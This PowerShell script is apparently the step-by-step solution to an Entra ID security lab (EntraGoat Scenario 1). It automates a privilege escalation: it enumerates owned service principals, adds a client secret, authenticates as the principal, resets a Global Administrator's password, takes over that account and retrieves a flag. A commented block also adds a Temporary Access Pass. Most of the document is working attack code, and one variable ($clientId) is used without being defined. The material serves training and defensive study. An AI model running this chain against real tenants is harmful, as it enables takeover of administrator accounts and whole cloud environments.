<#
.SYNOPSIS
EntraGoat Scenario 1: Walkthrough step-by-step solution
This can be done from the UI as well, this script automates the process

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 1 - Exploiting Service Principal (SP) Ownership for Privilege Escalation

Attack flow: 

1. The attacker starts as a low-privileged Entra ID user. 
Thanks to a misconfiguration, this user is listed as an owner of a SP - as well-thought-out as giving a goat a chainsaw and asking it to 'trim just the hedges'.

2. Because SP owners can manage credentials, the attacker adds a new client secret to it. 
No approval, no alert - yep, completely valid behavior from the platform's perspective.

3. Using the newly added secret and SP object ID, the attacker authenticates as the SP. 
The low-priv user is now wearing a much fancier hat.

4. The SP has the Privileged Authentication Administrator (PAA) role. 
This role allows resetting passwords for sensitive accounts, including Global Administrators (GA). Yes, really.

5. Resetting the Global Admin's Password
With the PAA privileges, the attacker resets the password of a Global Administrator.
No phishing, no persistence tricks - just raw role power obtained through a misconfigured ownership chain.

6. Taking Over the Admin Account
The attacker logs in with the freshly reset Global Admin password and assumes full control of the tenant.
While the access is technically legitimate, it's far from invisible - logs will show the password reset event, the sign-in IP, device fingerprint, and more.

From a defender's perspective, these are plenty breadcrumbs to follow:
Who reset the password? From where? What followed?
Even if it looks like routine admin behavior, it's a classic case of "legit credentials, malicious intent."

- - - 

--> So... why this works?
Microsoft allows SP owners to manage credentials without additional approval.
When those SPs are assigned sensitive roles, ownership becomes a critical path for privilege escalation.
Low-priv users might own SPs if:
* App registrations are open (default setting)
* They created an app that later got privileged roles
* Ownership was granted temporarily and never removed
* A multi-tenant app was consented to and they were assigned as owners

This scenario highlights how minor misconfigurations, like unchecked SP ownership, can snowball into major breaches when owner list audits are neglected.
________________________________________________________________________________________________________________________________________________

.NOTES
Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
you must have the function/BARK toolkit loaded in PS memory to use this function but other tools (or Connect-MgGraph) can be used as well.
#>

function Find-OwnedServicePrincipals {
    param([string]$UserId)
    
    # Get all service principals in tenant
    $allSPs = Get-MgServicePrincipal -All
    Write-Host "Found $($allSPs.Count) service principals in tenant"
    
    $ownedSPs = @()
    $checkCount = 0
    
    # Check ownership of each service principal
    foreach ($sp in $allSPs) {
        $checkCount++
        if ($checkCount % 50 -eq 0) {
            Write-Host "Checked $checkCount/$($allSPs.Count) service principals..."
        }
        
        try {
            $owners = Get-MgServicePrincipalOwner -ServicePrincipalId $sp.Id -ErrorAction SilentlyContinue
            if ($owners) {
                foreach ($owner in $owners) {
                    if ($owner.Id -eq $UserId) {
                        $ownedSPs += $sp
                        Write-Host "OWNED SERVICE PRINCIPAL FOUND!" -ForegroundColor Red
                        Write-Host "   Name: $($sp.DisplayName)" -ForegroundColor Yellow
                        Write-Host "   SP ID: $($sp.Id)" -ForegroundColor Yellow
                        Write-Host "   App ID: $($sp.AppId)" -ForegroundColor Yellow
                        break
                    }
                }
            }
        } catch {
            continue
        }
    }
    return $ownedSPs
}


function Get-ServicePrincipalRoles {
    param([object]$ServicePrincipal)
    
    Write-Host "Checking roles for: $($ServicePrincipal.DisplayName)"
    
    # Check directory role assignments for the service principal
    $roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($ServicePrincipal.Id)'" -ErrorAction SilentlyContinue
    $roles = @()
    
    if ($roleAssignments) {
        foreach ($assignment in $roleAssignments) {
            $roleDefinition = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $assignment.RoleDefinitionId
            $roles += $roleDefinition
            Write-Host "   Role: $($roleDefinition.DisplayName)" -ForegroundColor Green
        }
    } else {
        Write-Host "   No directory roles assigned"
    }
    
    return $roles
}

# Configuration settings for convenience
$tenantId = "[YOUR-TENANT-ID]"
$UPN = "david.martinez@[YOUR-TENANT-DOMAIN-NAME].onmicrosoft.com"
$password = "GoatAccess!123"


# Step 1: Authenticate as the low-privileged user using BARK function
$userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
$userAccessToken = $userToken.access_token
$SecureToken = ConvertTo-SecureString $userAccessToken -AsPlainText -Force
Connect-MgGraph -AccessToken $SecureToken

# Verify authentication and context
Get-MgContext

# for a much more detailed security context we can decode the JWT token issued to us with Parse-JWTToken function from BARK
# Parse-JWTToken -Token $userAccessToken

# Step 2: Enumeration 
# Get current user details
$currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"
$currentUser


# Find service principals owned by current user
$ownedSPs = Find-OwnedServicePrincipals -UserId $currentUser.Id

# Check what roles each owned service principal has
foreach ($sp in $ownedSPs) {
    $roles = Get-ServicePrincipalRoles -ServicePrincipal $sp
}

# Save the SP object ID
$targetSPId = $ownedSPs | Where-Object { $_.DisplayName -eq "HR Analytics Dashboard"} | Select-Object -First 1 -ExpandProperty Id

# Step 3: Since we own the SP, we can add a secret to it
$secretDescription = "EntraGoat-Secret-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$passwordCredential = @{
    DisplayName = $secretDescription
    EndDateTime = (Get-Date).AddYears(1)
}

$newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $targetSPId -PasswordCredential $passwordCredential

# Save the added secret details
$clientSecret = $newSecret.SecretText

# Disconnect current session 
Disconnect-MgGraph

# Step 4: Authenticate as the SP
$secureSecret = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $clientId, $secureSecret
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential

# Verify SP authentication
Get-MgContext

# Find the admin user details
$targetAdmin = Get-MgUser -Filter "startswith(userPrincipalName, 'EntraGoat-admin-s1')"

# Step 5: We have the SP role of Privileged Authentication Administrator, so we can reset the admin password, right?
$newAdminPassword = "EntraGoat-$(Get-Date -Format 'yyyyMMdd-HHmmss')!"
$passwordProfile = @{
    Password = $newAdminPassword
    ForceChangePasswordNextSignIn = $false
}

Update-MgUser -UserId $targetAdmin.Id -PasswordProfile $passwordProfile
$newAdminPassword

# We can even add authentication methods of Temporary Access Pass if needed 
# $tempAccessPass = @{
#     "@odata.type" = "#microsoft.graph.temporaryAccessPassAuthenticationMethod"
#     "lifetimeInMinutes" = 60
#     "isUsableOnce" = $false
# }
# $TAP = New-MgUserAuthenticationTemporaryAccessPassMethod -UserId $targetAdmin.Id -BodyParameter $tempAccessPass
# $TAP.TemporaryAccessPass
# log in as the admin user with the TAP to Azure Portal 

# Disconnect SP session
Disconnect-MgGraph

# Step 6: Authenticate as the compromised admin
$adminToken = Get-MSGraphTokenWithUsernamePassword -Username $targetAdmin.UserPrincipalName -Password $newAdminPassword -TenantID $tenantId
$adminAccessToken = $adminToken.access_token
$SecureAdminToken = ConvertTo-SecureString $adminAccessToken -AsPlainText -Force
Connect-MgGraph -AccessToken $SecureAdminToken

# Verify admin authentication
Get-MgContext

# You can decode the JWT token issued to the admin user for it's security context, do you see the differences?
# Parse-JWTToken -Token $userAccessToken
#                VS
# Parse-JWTToken -Token $adminAccessToken

# Step 7: Retrieve flag
Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName,onPremisesExtensionAttributes' |
    Select-Object @{n='UPN';e={$_.userPrincipalName}},
                  @{n='Id';e={$_.id}},
                  @{n='Flag';e={$_.onPremisesExtensionAttributes.extensionAttribute1}}

# Disconnect admin session
Disconnect-MgGraph


# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing the source code for EntraGoat Scenario 1.